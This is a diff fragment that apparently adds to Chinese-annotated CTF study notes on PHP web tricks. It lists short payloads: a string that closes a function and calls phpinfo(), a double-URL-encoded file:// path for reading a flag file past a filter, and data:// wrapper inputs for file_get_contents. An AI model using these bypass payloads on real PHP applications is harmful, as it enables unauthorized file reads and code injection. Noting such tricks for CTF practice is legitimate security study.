@@ -97,3 +97,21 @@ function abc(){
 	return "123";}phpinfo();//
 }
 ```
+
+```php
+strpos("","php") 
+```
+
+```
+file:///var/www/html/flag.%2570hp
+```
+
+data协议
+
+```php
+file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo=');
+```
+
+```
+data://image/jpeg;base64
+```
